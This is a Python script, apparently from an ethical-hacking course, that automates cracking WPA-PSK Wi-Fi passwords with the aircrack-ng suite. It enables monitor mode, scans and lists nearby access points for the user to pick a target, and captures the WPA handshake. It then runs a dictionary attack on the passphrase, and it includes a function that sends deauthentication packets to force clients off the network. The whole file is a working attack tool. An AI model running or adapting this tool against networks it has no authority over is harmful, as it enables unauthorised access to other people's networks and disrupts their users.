import sys, os, subprocess, shutil
import argparse
from argparse import ArgumentParser
import tempfile
import atexit
# import pandas
import time
import re # regex to validate MAC addresses
import csv # to read airodump output file


###############################################################
# Specify directory to store temporary intercepted packets
# Default: Dumps temporary data in current working directory (creates directory "./packets")
packetPath = ""

# Specify path to custom dictionary for cracking
# Default: Uses included dictionary (if dictionary.txt exists)
dictionaryPath = ""

# Specify interface name of the monitor-mode-capable device you
# would like to use.
# Default: Searches for monitor-mode-capable devices at runtime
interfaceName = ""

# Specify access point MAC address (BSSID) to target
# Default: Present user with detected access points to choose from
# targetBSSID = "10:BF:48:D3:93:B8" # CS378-EthicalHacking-GDC-2.212
targetBSSID = ""

# Specify access point readable name (ESSID) to target
# Default: Present user with detected access points to choose from
# targetBSSID = "10:BF:48:D3:93:B8" # CS378-EthicalHacking-GDC-2.212
targetESSID = ""

# Specify channel to scan on
# Default: Prompt user to choose channel or scan all channels
# channel = "6"
channel = ""

# Verbose output flag
# Default: False
verbose = False

# Prompt user for scan times before scanning
# Default: False
promptScanTime = False

# List of all running processes (to kill in cleanUp())
procs = []
###############################################################


def main():
	if not os.geteuid() == 0:
		sys.exit('Please run as root')
	try:
		print(asciiAirEmblem)
		environmentSetup()
		# killInterference()
		while targetBSSID == "" or channel == "":
			getTargetAccessPoint()
		captureHandshake()
		crackHandshake()
	finally:
		# this ensures that clean up occurs even on error
		cleanUp()


def is_valid_path(parser, arg):
    if not os.path.exists(arg):
        parser.error("The path %s does not exist!" % arg)


def bash_command(cmd, stdout=subprocess.PIPE, stderr=None, stdin=subprocess.PIPE, shell=False):
	process = subprocess.Popen(cmd.split(),
			stdout=stdout,
			stderr=stderr,
			stdin=stdin,
			shell=shell)
	return process


class readable_dir(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        prospective_dir=values
        if not os.path.isdir(prospective_dir):
            raise argparse.ArgumentTypeError("readable_dir:{0} is not a valid path".format(prospective_dir))
        if os.access(prospective_dir, os.R_OK):
            setattr(namespace,self.dest,prospective_dir)
        else:
            raise argparse.ArgumentTypeError("readable_dir:{0} is not a readable dir".format(prospective_dir))


def environmentSetup():
	global packetPath
	global dictionaryPath
	global interfaceName
	global targetBSSID
	global targetESSID
	global channel
	global verbose
	global promptScanTime

	# Parse arguments
	parser = ArgumentParser()
	args = parseArguments(parser)

	# Make sure the user didn't pass anything spooky in
	verifyArgs(args)

	# Assign arguments to globals for ease of reference throughout program
	if args.datadump:
		packetPath = args.datadump
	if args.dictionary:
		dictionaryPath = args.dictionary
	if args.interface:
		interfaceName = args.interface
	if args.mac:
		targetBSSID = args.mac
	if args.name:
		targetESSID = args.name
	if args.channel:
		channel = args.channel
	if args.verbose:
		verbose = True
	if args.scantime:
		promptScanTime = True

	''' DEFAULTS -
	The following if statements will only execute if the user
	user did NOT specify that particular attribute either globally
	(in this file) or via the commandline. '''	
	if not packetPath:
		# use default path for packet data dump
		if not os.path.exists(os.getcwd() + "/packets"):
			# create packets directory if it doesn't exist
			os.makedirs(os.getcwd() + "/packets")
		packetPath = os.getcwd() + "/packets/"

	if not dictionaryPath:
		# prompt user to specify path to dictionary
		while not dictionaryPath:
			dp = input("Specify path to dictionary: ")

			if len(dp) > 0 and dp.find('/', 0, 1) == 0:
				# absolute path
				if not os.path.isfile(dp):
					print("Path to dictionary does not exist: " + dp)
					continue
			elif len(dp) > 0:
				# relative path
				dp = os.getcwd() + '/' + dp
				if not os.path.isfile(dp):
					print("Path to dictionary does not exist: " + dp)
					continue
			else:
				# invalid input
				print("Invalid input for dictionary path: " + dp)
				continue

			# valid path
			dictionaryPath = dp
			break

	# get name of wireless interface to use
	# getInterfaceName() should raise exception if no compatible device found
	if interfaceName == '':
		print("Getting interfaces...")
		interfaceName = getInterfaceName()


def parseArguments(parser):
	parser.add_argument('-p', '--datadump', help='Directory to store temporary data (intercepted packets)\n\
						Default: dumps temporary data in current working directory', type=str)
	parser.add_argument('-d', '--dictionary', help='Path to dictionary for aircrack to use\n\
						Default: uses included dictionary (if dictionary.txt exists)', type=str) # How will this work?
	parser.add_argument('-i', '--interface', help='Interface name of the monitor-mode-capable device you would like to use\n\
						Default: searches for monitor-mode-capable devices at runtime', type=str)
	parser.add_argument('-m', '--mac', help='Target access point MAC address (BSSID)\n\
						Default: present user with detected access points to choose from', type=str)
	parser.add_argument('-n', '--name', help='Target access point readable name (ESSID)\n\
						Default: present user with detected access points to choose from', type=str)
	parser.add_argument('-c', '--channel', help='Channel to scan on\n\
						Default: prompt user to specify channel or scan all channels', type=str)
	parser.add_argument('-v', '--verbose', help='Verbose output flag\n\
						Default: False', action="store_true")
	parser.add_argument('-s', '--scantime', help='Prompt user for scan times before scanning\n\
						Default: False', action="store_true")

	args = parser.parse_args()

	return args


def verifyArgs(args):
	if args.datadump:
		if not os.path.exists(args.datadump):
			raise ValueError("Path for datadump not found: " + args.datadump)

	if args.dictionary:
		if not os.path.isfile(args.dictionary):
			raise ValueError("Path for dictionary not found: " + args.dictionary)

	if args.mac:
		if not validMacAddress(args.mac):
			raise ValueError("Invalid target MAC address format: " + args.mac)


def killInterference():
	global verbose

	print("Killing potential interfering processes...")
	process = bash_command("airmon-ng check kill")

	if verbose:
		print(process.stdout.read().decode('utf-8').strip())
	if process.stderr:
		print(process.stderr)

	print("Stopping avahi-daemon...")
	process = bash_command("/etc/init.d/avahi-daemon stop")

	if verbose:
		print(process.stdout.read().decode('utf-8'))
	if process.stderr:
		print(process.stderr)

	print("Taking your eth0 down...")
	process = bash_command("ifconfig eth0 down")

	if verbose:
		print(process.stdout.read().decode('utf-8'))
	if process.stderr:
		print(process.stderr)


def getTargetAccessPoint():
	''' airdump setup '''
	global interfaceName
	global channel
	global targetBSSID
	global targetESSID

	if channel == '' and targetESSID != '':
		channel = 0

	while channel == '':
		user_input = input("Channel number to listen to (0 to scan multiple): ")
		if user_input.isdigit() and 0 <= int(user_input) <= 14:
			channel = user_input
	# get result of airodump-ng
	AP_list = scanAccessPoints(interfaceName, channel)
	
	# get necessary columns (ESSID/BSSID/power/Authentication)
	ESSID_col = 0
	BSSID_col = 0
	power_col = 0
	channel_col = 0
	auth_col  = 0
	max_ESSID_len = 0
	for i,v in enumerate(AP_list[0]):
		ESSID_col   = i if 'ESSID' in v else ESSID_col
		BSSID_col   = i if 'BSSID' in v else BSSID_col
		power_col   = i if 'Power' in v else power_col
		auth_col    = i if 'Authentication' in v else auth_col
		channel_col = i if 'channel' in v else channel_col
	# hidden SSIDs are represented as repeating '\x00' character
	# replace this sequence with "<hidden>" for cleaner output
	for line in AP_list:
		if re.match(r"(\\x00)+", line[ESSID_col].strip()):
			line[ESSID_col] = "<hidden>"
	# the max ESSID width (for formatting later)
	for line in AP_list[1:]:
		max_ESSID_len = len(line[ESSID_col]) if len(line[ESSID_col]) > max_ESSID_len else max_ESSID_len

	# filter list for only WPA-PSK authenticated APs
	AP_list = [line for line in AP_list[1:] if 'PSK' in line[auth_col]]

	# if user specifies an ESSID (name), find out what BSSID it corresponds to
	if targetESSID != '':
		for line in AP_list:
			if line[ESSID_col] == targetESSID:
				targetBSSID = line[BSSID_col]
				channel = line[channel_col]
				return
	
	# if ESSID not specified, prompt the user to select an AP
	print()
	print("\t     Power Chan {:{width}}   BSSID".format('ESSID',width=max_ESSID_len))
	for i, v in enumerate(AP_list):
		print("\t[{:2}] {:<5} {:<4} {:{width}} : {}".format(str(i), v[power_col], v[channel_col], v[ESSID_col], v[BSSID_col], width=max_ESSID_len))
	print()

	# Get MAC address of the target access point (router)
	user_input = ''
	while not (user_input.isdigit() and 0 <= int(user_input) < len(AP_list)):
		user_input = input("Please select a target access point: ")

	targetBSSID = AP_list[int(user_input)][BSSID_col]
	channel = AP_list[int(user_input)][channel_col]

	print("targetBSSID = " + str(targetBSSID))


def scanAccessPoints(interfaceName, channel='0', scanTime=5):
	global packetPath
	global procs

	# Allow user to select an AP (access point) by MAC address
	print("Scanning for access points...")

	out = open(packetPath+"stdout.txt","wb")
	err = open(packetPath+"stderr.txt","wb")

	# generate airodump command (plus arguments)
	scan_command = "airodump-ng --output-format csv --encrypt wpa -w " + packetPath + "dump"
	if int(channel) > 0:
		scan_command += " -c " + str(channel)
	scan_command += " " + interfaceName
	# scan networks
	airodump = bash_command(scan_command, stdout=out, stderr=err)
	procs.append(airodump)

	# wait for airodump to dump AP csv list
	timeStart = time.time()
	while not os.path.isfile(packetPath+"dump-01.csv"):
		if time.time()-timeStart > scanTime:
			print("took too long")
			break
	# wait for scan of APs
	time.sleep(int(scanTime))

	# read output csv file for AP
	with open(packetPath+'dump-01.csv') as csvfile:
		AP_reader = csv.reader(csvfile, delimiter=',', quotechar='|')
		AP_dump = [line for line in AP_reader]
	# find AP in dump file
	begin = 0
	end = 0
	for i, line in enumerate(AP_dump):
		AP_dump[i] = [elem.strip() for elem in line]
		if 'BSSID' in line:
			begin = i
		if (len(line)==0) and  i>begin:
			end = i
			break
	# reduce list to just APs (not associated clients)
	AP_list = AP_dump[begin:end]

	# cleanup
	airodump.terminate()
	if os.path.isfile(packetPath + "dump-01.csv"):
		os.remove(packetPath + "dump-01.csv")

	return AP_list


def getInterfaceName():
	# get physical names and their corresponding device names
	phyToInterface = {}
	output = bash_command("iw dev").stdout.read().decode('utf-8').splitlines()
	for i, line in enumerate(output):
		if line.startswith('phy'):
			phyToInterface[output[i].strip().replace('#','')] = output[i+1].split()[1]

	# find out what modes each device supports
	modes = {}
	for phy in phyToInterface.keys():
		i=0
		# call "iw <dev> info"
		output = bash_command("iw "+phy+" info").stdout.read().decode('utf-8').splitlines()
		# read indented block following "Supported interface modes:" line
		while i<len(output):
			if output[i].strip() == "Supported interface modes:":
				modes[phy] = []
				level = len(output[i]) - len(output[i].lstrip('\t'))
				i+=1
				while (len(output[i]) - len(output[i].lstrip('\t'))) > level:
					modes[phy].append(output[i].strip())
					i += 1
			i+=1

	# count how many devices support monitor mode
	compatibleDevices = sorted([phy for phy in modes.keys() if any("monitor" in s for s in modes[phy])])

	# check if there are 1 or fewer compatible devices
	chosenDevice = None
	if len(compatibleDevices) == 0:
		print("No compatible wireless devices found.")
	elif len(compatibleDevices) == 1:
		print("Found one compatible wireless device: " +
			compatibleDevices[0] + " : " + phyToInterface[compatibleDevices[0]])
		chosenDevice = compatibleDevices[0]

	# ask the user to choose a wireless interface
	while chosenDevice == None:
		for i, phy in enumerate(compatibleDevices):
			print("\t[{}] {:5} : {}".format(str(i), phy, phyToInterface[phy]))

		choice = input(str(len(compatibleDevices)) + " compatible wireless devices found. Please choose: ")
		if choice.isdigit() and (0 <= int(choice) < len(compatibleDevices)):
			chosenDevice = compatibleDevices[int(choice)]
		else:
			print(choice + " is an invalid option, please try again.\n")

	# enable monitor mode on interface for chosen device
	print("Enabling monitor mode on " + phyToInterface[chosenDevice] + "...")
	process = bash_command("airmon-ng start " + phyToInterface[chosenDevice])
	# wait for airmon-ng to complete
	process.communicate(timeout=10)

	# update interface names for devices
	output = bash_command("iw dev").stdout.read().decode('utf-8').splitlines()
	for i, line in enumerate(output):
		phy = line.strip().replace('#','')
		if phy == chosenDevice:
			interface = output[i+1].split()[1]
			if interface != phyToInterface[chosenDevice]:
				phyToInterface[phy] = interface
				print("Updated interface name: " + phyToInterface[chosenDevice])

	return phyToInterface[chosenDevice]


def captureHandshake():
	global targetBSSID
	global interfaceName
	global promptScanTime

	# listen for a WPA handshake, run for given amount of time, deauthing
	# clients meanwhile
	scanTime = '40'
	if promptScanTime:
		while not scanTime.isdigit():
			scanTime = input("Time limit to listen for WPA handshake (seconds): ")

	# List all clients connected to target AP
	# generate airodump command (plus arguments)
	scan_command = "airodump-ng --output-format cap --output-format csv -w " + packetPath+"packet" + " --bssid " + str(targetBSSID)
	if int(channel) > 0:
		scan_command += " -c " + str(channel)
	scan_command += " " + interfaceName
	# dump packets to/from target AP
	# airodump_proc = bash_command(scan_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	airodump_proc = bash_command(scan_command, stdout=None, stderr=None, stdin=None)
	procs.append(airodump_proc)

	timeStart = time.time()
	# keep scanning until we get a WPA handshake
	f = open('log.txt','w')
	while True:
		# check if we've captured a handshake
		proc = bash_command("aircrack-ng -w " +dictionaryPath+" " + packetPath+"packet-01.cap", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		try:
			outs, errs = proc.communicate(timeout=1)
		except subprocess.TimeoutExpired:
			proc.kill()
			outs, errs = proc.communicate()

		# Deauthenticate clients until a handshake appears in the packet dump
		if not ('No networks found' in outs.decode('utf-8') or
				'no data packets from target' in outs.decode('utf-8') or
				'No valid WPA handshakes' in outs.decode('utf-8')):
			break
		# client_list = scanClientsAtAccessPoint()
		# for client in client_list:
		# 	deauthenticateClient(client)

		if time.time()-timeStart > int(scanTime):
			break

	print("terminating airodump")
	airodump_proc.kill()


def scanClientsAtAccessPoint(scanTime=5):
	global targetBSSID
	global targetESSID
	global channel
	global interfaceName

	# Allow user to select an AP (access point) by MAC address
	# if not targetESSID:
	# 	print("Scanning clients connected to access point " + targetBSSID + "...")
	# else:
	# 	print("Scanning clients connected to access point " + targetESSID + "...")

	# wait for airodump to dump client csv list
	timeStart = time.time()
	while not os.path.isfile(packetPath+"packet-01.csv"):
		if time.time()-timeStart > scanTime:
			print("took too long")
			break
		time.sleep(1)
	# wait for scan of clients
	time.sleep(int(scanTime))

	# read output csv file for clients
	with open(packetPath+'packet-01.csv') as csvfile:
		client_reader = csv.reader(csvfile, delimiter=',', quotechar='|')
		client_dump = [line for line in client_reader]
	# find clients in dump file
	for i, line in enumerate(client_dump):
		if 'Station MAC' in line:
			client_dump = client_dump[i+1:]
			break
	client_list = [line[0] for line in client_dump if len(line)>0]
	

	return client_list


def deauthenticateClient(clientMacAddress):
	global targetBSSID
	global targetESSID
	global interfaceName
	global channel

	#if not targetESSID:
	#	print("Deauthenticating client " + clientMacAddress + " at AP " + targetBSSID)
	#else:
	#	print("Deauthenticating client " + clientMacAddress + " at AP " + targetESSID)

	aireplay_proc = bash_command("aireplay-ng" + 
			" -0 1" + # send 1 deauth packet
			" -a " + targetBSSID +
			" -c " + clientMacAddress +
			" " + interfaceName)
	#print(aireplay_proc.stdout.read().decode('utf-8').strip())


def validMacAddress(address):
	return re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", address.lower())


def crackHandshake():
	global targetBSSID
	global dictionaryPath
	global packetPath

	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + targetBSSID + " " + packetPath + "packet-01.cap", stdout=None, stderr=None, stdin=None)
	process.wait()


def cleanUp():
	global procs

	if os.path.exists(packetPath):
		shutil.rmtree(packetPath)
	for proc in procs:
		if proc:
			proc.kill()

asciiAirEmblem = '''\
        ***********                    
    .***                               
  ,**,                                 
 ***                   .**********     
***   ***.  ***       **,        ****  
**   **        **    **   *****    *** 
**  ,*   ***   **   **  **    ,**   ***
**   **    .*  **   **  ** **   **   **
.**   ******* ,**    **  ***    **   **
  **,        ***     .**       **    **
    **********         ,********     **
                                    ** 
    *        *****,*****           **                d8888 d8b         888                             888                  
    *       **    ,,   **,        **                d88888 Y8P         888                             888                  
    **     **    ** **  ***     *.                 d88P888             888                             888                  
    ,*     **    **  **  **                       d88P 888 888 888d888 88888b.   .d88b.  88888b.   .d88888  .d88b.  888d888 
     **     **      **   **                      d88P  888 888 888P"   888 "88b d8P  Y8b 888 "88b d88" 888 d8P  Y8b 888P"   
      ***     *******   **                      d88P   888 888 888     888  888 88888888 888  888 888  888 88888888 888     
        ***.          ***                      d8888888888 888 888     888 d88P Y8b.     888  888 Y88b 888 Y8b.     888     
          ,************                       d88P     888 888 888     88888P"   "Y8888  888  888  "Y88888  "Y8888  888     
'''
asciiArrowBox = '''\
###############/*******\###############
#             #/*******\#             #
#             (/*******\)             #
#             (/*******\)             #
#             (/*******\)             #
#             (/*******\)             #
#             (/*******\)             #
#             #/*******\#             #
#     \((\\\\\\\\\\\\*********//////))/     #
#       \((*****************))/       #
#         \#(*************)#/         #
#           \#(*********)#/           #
#             \#(*****)#/             #
#               \#(*)#/               #
#                 \#/                 #
#                                     #
#                                     #
#                                     #
#                                     #
#######################################
'''
if __name__ == "__main__":
	main()

